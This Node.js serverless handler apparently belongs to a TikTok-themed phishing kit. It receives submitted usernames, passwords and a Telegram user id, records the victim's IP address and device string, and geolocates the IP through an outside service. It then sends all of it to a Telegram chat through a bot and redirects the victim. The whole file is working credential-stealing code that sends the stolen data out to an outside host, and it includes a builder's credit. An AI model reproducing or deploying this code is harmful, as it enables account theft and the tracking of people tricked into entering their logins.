const fetch = require('node-fetch');
const { Telegraf } = require('telegraf');

const bot = new Telegraf(process.env.BOT_TOKEN);

module.exports = async (req, res) => {
  if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');

  const { username, password, uid } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'];
  const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Kabul' });

  let geo = {};
  try {
    geo = await fetch(`http://ip-api.com/json/${ip}`).then(r => r.json());
  } catch (e) {
    geo = {};
  }

  const message = `
╭─── 𝗧𝗶𝗸𝗧𝗼𝗸 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗗𝗮𝘁𝗮 𝗦𝘂𝗯𝗺𝗶𝘁𝘁𝗲𝗱 ✅ ───╮
├ 👤 Username: ${username}
├ 🔐 Password: ${password}
├ 🆔 ID: ${uid}
├ 📆 Time: ${timestamp}
├ 🌐 IP: ${ip}
├ 🏙️ City: ${geo.city || 'Kabul'}
├ 🌍 Country: Afghanistan
├ 🛰️ ISP: ${geo.isp || 'Unknown'}
├ 📱 Device: ${userAgent}
╰━━━━━━━━━━━━━━━━━━━━━━╯

📌 ✅ Data successfully received

━━━━━━━━━━━━━━━━━╯
──────╮
│ 🧑🏻‍💻 *𝗕𝘂𝗶𝗹𝘁 𝗕𝘆:* 💛 *𝗪𝗔𝗖𝗜𝗤*    
╰────────────╯ 
`;

  try {
    await bot.telegram.sendMessage(uid, message, { parse_mode: "Markdown" });
    return res.redirect('https://t.me/YourBotUsername'); // دا redirect کولاې شې بدل کړې
  } catch (e) {
    console.error("Telegram Error:", e.message);
    return res.status(500).send("❌ Failed to send message.");
  }
}; 
